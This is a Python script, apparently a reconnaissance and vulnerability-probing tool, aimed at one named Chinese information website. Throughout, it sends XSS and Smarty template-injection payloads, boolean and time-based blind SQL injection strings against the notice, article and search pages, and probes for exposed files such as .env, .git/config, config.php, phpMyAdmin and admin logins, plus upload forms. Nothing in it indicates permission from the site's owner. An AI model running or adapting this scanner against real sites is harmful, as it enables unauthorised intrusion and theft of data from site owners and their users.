import subprocess
import time
import re

TARGET = "https://www.malaqin.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

def curl_get(path, timeout=12):
    url = TARGET + path
    cmd = ["curl", "-s", "-i", "-k", "-A", UA, "--compressed", "--max-time", str(timeout),
           "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
           "-H", "Accept-Language: zh-CN,zh;q=0.9",
           url]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+5)
        output = result.stdout
        if not output:
            return {"status": "EMPTY", "body": "", "body_len": 0, "headers": result.stderr[:200]}
        if "\r\n\r\n" in output:
            headers_part, body = output.split("\r\n\r\n", 1)
        elif "\n\n" in output:
            headers_part, body = output.split("\n\n", 1)
        else:
            headers_part = output
            body = ""
        first_line = headers_part.split("\n")[0] if headers_part else ""
        status = first_line.split(" ")[1] if len(first_line.split(" ")) > 1 else "?"
        return {"status": status, "body": body, "body_len": len(body), "headers": headers_part}
    except Exception as e:
        return {"status": "ERROR", "body": "", "body_len": 0, "headers": str(e), "error": str(e)}

def main():
    print("=" * 70)
    print("  玛拉沁信息网 (malaqin.cn) 漏洞验证")
    print("=" * 70)

    # 先测试连通性
    print("\n[0] 连通性测试")
    print("-" * 60)
    r = curl_get("/")
    print(f"  首页: [{r['status']}] {r['body_len']}B")
    if r["body_len"] > 0:
        print(f"  首页前100字符: {r['body'][:100]}")
    
    # 也测试HTTP
    cmd_http = ["curl", "-s", "-i", "-k", "-A", UA, "--max-time", "10",
                "-H", "Accept: text/html",
                "http://www.malaqin.cn/"]
    result = subprocess.run(cmd_http, capture_output=True, text=True, timeout=15)
    if result.stdout:
        print(f"  HTTP首页: {len(result.stdout)}B (有响应)")
        if "\r\n\r\n" in result.stdout:
            h, b = result.stdout.split("\r\n\r\n", 1)
            print(f"  HTTP状态: {h.split(chr(10))[0][:60]}")
    else:
        print(f"  HTTP首页: 无响应, stderr: {result.stderr[:100]}")

    if r["body_len"] == 0:
        print("\n  !! HTTPS无法获取内容，尝试使用HTTP...")
        # 改用HTTP
        global TARGET
        TARGET = "http://www.malaqin.cn"
        r = curl_get("/")
        print(f"  HTTP首页: [{r['status']}] {r['body_len']}B")
        if r["body_len"] > 0:
            print(f"  首页前100字符: {r['body'][:100]}")

    # ============================================================
    print("\n[1] 模板变量注入/XSS 验证")
    print("-" * 60)
    
    xss_tests = [
        ("/?site_remen=test_xss_12345", "GET site_remen=test"),
        ("/index.php?site_remen=test_xss_12345", "GET index.php?site_remen=test"),
        ("/?site_remen=%22%3Balert(1)%3B%2F%2F", "XSS: 闭合引号 alert"),
        ("/index.php?site_remen=%22%3Balert(1)%3B%2F%2F", "XSS: index.php 闭合引号"),
        ("/?site_remen={if%201==1}xss_test_if{/if}", "Smarty {if}标签注入"),
        ("/index.php?site_remen={if%201==1}xss_test_if{/if}", "Smarty {if} index.php"),
        ("/?isapp=test_isapp_123", "GET isapp=test"),
        ("/index.php?isapp=test_isapp_123", "GET index.php?isapp=test"),
    ]
    
    for path, label in xss_tests:
        r = curl_get(path)
        body = r["body"]
        markers = ["test_xss_12345", "xss_test_if", "test_isapp_123", "alert(1)", '";alert']
        found = [m for m in markers if m in body]
        tpl_unresolved = "{$site_remen}" in body or "{$isapp}" in body
        
        if found:
            print(f"  !! [{r['status']}] {r['body_len']}B  {label}")
            for m in found:
                idx = body.find(m)
                context = body[max(0,idx-60):idx+80]
                print(f"         发现 '{m}': ...{context}...")
        elif tpl_unresolved:
            print(f"  ** [{r['status']}] {r['body_len']}B  {label} (模板变量未解析)")
        else:
            print(f"     [{r['status']}] {r['body_len']}B  {label}")
        time.sleep(0.3)

    # ============================================================
    print("\n[2] SQL注入验证 - notice/article模块")
    print("-" * 60)
    
    # 先获取基线
    r_base = curl_get("/notice/notice_376.html")
    base_size = r_base["body_len"]
    base_body = r_base["body"]
    print(f"  基线 notice_376: [{r_base['status']}] {base_size}B")
    
    sqli_tests = [
        ("/notice/notice_376.html", "基线"),
        ("/notice/notice_376'+OR+'1'='1.html", "OR 1=1"),
        ("/notice/notice_376'+AND+'1'='2.html", "AND 1=2"),
        ("/notice/notice_376'+AND+SLEEP(3)--.html", "SLEEP(3)时间盲注"),
        ("/notice/notice_376%27+OR+%271%27%3D%271.html", "URL编码OR 1=1"),
        ("/notice/notice_376%27+AND+%271%27%3D%272.html", "URL编码AND 1=2"),
    ]
    
    for path, label in sqli_tests:
        start = time.time()
        r = curl_get(path, timeout=15)
        elapsed = time.time() - start
        
        body = r["body"]
        sql_errors = ["SQL syntax", "mysql_fetch", "mysql_query", "Warning: mysql",
                       "You have an error", "SQLSTATE", "mysqli_error"]
        found_errors = [e for e in sql_errors if e.lower() in body.lower()]
        
        if found_errors:
            print(f"  !! [{r['status']}] {r['body_len']}B  耗时:{elapsed:.1f}s  {label}")
            print(f"         SQL错误: {found_errors}")
        elif "SLEEP" in label and elapsed > 2.5:
            print(f"  !! [{r['status']}] {r['body_len']}B  耗时:{elapsed:.1f}s  {label} - 可能时间盲注!")
        elif label == "基线":
            print(f"     [{r['status']}] {r['body_len']}B  耗时:{elapsed:.1f}s  {label}")
        else:
            diff = r["body_len"] - base_size
            print(f"     [{r['status']}] {r['body_len']}B  差异:{diff:+d}  耗时:{elapsed:.1f}s  {label}")
        time.sleep(0.3)

    # article 模块
    print()
    r_base2 = curl_get("/article/article_16332.html")
    base_size2 = r_base2["body_len"]
    print(f"  基线 article_16332: [{r_base2['status']}] {base_size2}B")
    
    sqli_tests2 = [
        ("/article/article_16332.html", "基线"),
        ("/article/article_16332'+OR+'1'='1.html", "OR 1=1"),
        ("/article/article_16332'+AND+'1'='2.html", "AND 1=2"),
        ("/article/article_16332'+AND+SLEEP(3)--.html", "SLEEP(3)时间盲注"),
    ]
    
    for path, label in sqli_tests2:
        start = time.time()
        r = curl_get(path, timeout=15)
        elapsed = time.time() - start
        
        body = r["body"]
        sql_errors = ["SQL syntax", "mysql_fetch", "Warning: mysql", "You have an error", "SQLSTATE"]
        found_errors = [e for e in sql_errors if e.lower() in body.lower()]
        
        if found_errors:
            print(f"  !! [{r['status']}] {r['body_len']}B  耗时:{elapsed:.1f}s  {label}")
            print(f"         SQL错误: {found_errors}")
        elif "SLEEP" in label and elapsed > 2.5:
            print(f"  !! [{r['status']}] {r['body_len']}B  耗时:{elapsed:.1f}s  {label} - 可能时间盲注!")
        elif label == "基线":
            print(f"     [{r['status']}] {r['body_len']}B  耗时:{elapsed:.1f}s  {label}")
        else:
            diff = r["body_len"] - base_size2
            print(f"     [{r['status']}] {r['body_len']}B  差异:{diff:+d}  耗时:{elapsed:.1f}s  {label}")
        time.sleep(0.3)

    # ============================================================
    print("\n[3] 搜索功能SQL注入")
    print("-" * 60)
    
    search_tests = [
        ("/index.php?m=search&kw=test123", "搜索基线"),
        ("/index.php?m=search&kw=test123'+OR+'1'='1", "搜索 OR 1=1"),
        ("/index.php?m=search&kw=test123'+AND+'1'='2", "搜索 AND 1=2"),
        ("/index.php?m=search&kw=test123'+AND+SLEEP(3)--", "搜索 SLEEP(3)"),
    ]
    
    for path, label in search_tests:
        start = time.time()
        r = curl_get(path, timeout=15)
        elapsed = time.time() - start
        
        body = r["body"]
        sql_errors = ["SQL syntax", "mysql_fetch", "Warning: mysql", "You have an error", "SQLSTATE"]
        found_errors = [e for e in sql_errors if e.lower() in body.lower()]
        
        if found_errors:
            print(f"  !! [{r['status']}] {r['body_len']}B  耗时:{elapsed:.1f}s  {label}")
            print(f"         SQL错误: {found_errors}")
        elif "SLEEP" in label and elapsed > 2.5:
            print(f"  !! [{r['status']}] {r['body_len']}B  耗时:{elapsed:.1f}s  {label} - 可能时间盲注!")
        else:
            print(f"     [{r['status']}] {r['body_len']}B  耗时:{elapsed:.1f}s  {label}")
        time.sleep(0.3)

    # ============================================================
    print("\n[4] 敏感文件/路径探测")
    print("-" * 60)
    
    sensitive_paths = [
        "/admin/",
        "/admin/login.php",
        "/admin/index.php",
        "/manage/",
        "/manager/",
        "/config.php",
        "/config.inc.php",
        "/db.php",
        "/database.php",
        "/conn.php",
        "/.env",
        "/.git/config",
        "/backup/",
        "/data/",
        "/cache/",
        "/upload/",
        "/UploadFile/",
        "/phpmyadmin/",
        "/phpMyAdmin/",
        "/test.php",
        "/phpinfo.php",
        "/info.php",
        "/install/",
        "/install.php",
        "/robots.txt",
        "/sitemap.xml",
        "/template/wap/main/default/config.php",
        "/include/config.php",
        "/api/",
        "/api.php",
    ]
    
    # 获取404基线
    r_404 = curl_get("/nonexistent_xyz_12345")
    not_found_size = r_404["body_len"]
    print(f"  404基线: [{r_404['status']}] {not_found_size}B")
    
    for path in sensitive_paths:
        r = curl_get(path, timeout=8)
        status = r["status"]
        blen = r["body_len"]
        
        if status in ("200", "301", "302", "403", "500") and blen > 0:
            # 排除与404页面相同大小的响应
            if blen != not_found_size:
                print(f"  [{status}] {blen:6d}B  {path}")
                if blen < 500 and status == "200":
                    print(f"         内容: {r['body'][:200]}")
        time.sleep(0.15)

    # ============================================================
    print("\n[5] 会员/上传功能探测")
    print("-" * 60)
    
    member_paths = [
        "/member/",
        "/member/login.php",
        "/member/register.php",
        "/member/index.php",
        "/memberinfo/",
        "/memberinfo/InfoPublish",
        "/memberarticle/",
        "/memberarticle/publisharticle",
    ]
    
    for path in member_paths:
        r = curl_get(path, timeout=8)
        status = r["status"]
        blen = r["body_len"]
        if status in ("200", "301", "302", "403") and blen > 100:
            print(f"  [{status}] {blen:6d}B  {path}")
            if "upload" in r["body"].lower() and "enctype" in r["body"].lower():
                print(f"         !! 发现文件上传表单!")
        time.sleep(0.2)

    print("\n验证完成。")

if __name__ == "__main__":
    main()
